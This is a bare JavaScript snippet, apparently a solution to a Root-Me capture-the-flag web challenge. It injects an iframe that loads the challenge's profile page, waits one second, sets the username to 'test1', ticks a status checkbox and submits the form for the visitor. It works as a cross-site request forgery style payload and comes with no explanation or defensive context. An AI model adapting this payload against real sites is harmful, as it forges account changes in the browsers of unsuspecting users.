const body1 = document.querySelector("body")

const html1 = `
<iframe
 id="iframe1"
 src="http://challenge01.root-me.org/web-client/ch23/?action=profile"
onload='
  const ifr = document.querySelector("#iframe1");
  setTimeout(() => {
    const doc = ifr.contentDocument;
    const pseudo = doc.querySelector("#username");
    const status = doc.querySelector("#status");
    
    pseudo.value = "test1";
    status.checked = true;
    doc.forms[0].submit();
  }, 1000); '
>
</iframe>

`

body1.innerHTML += html1





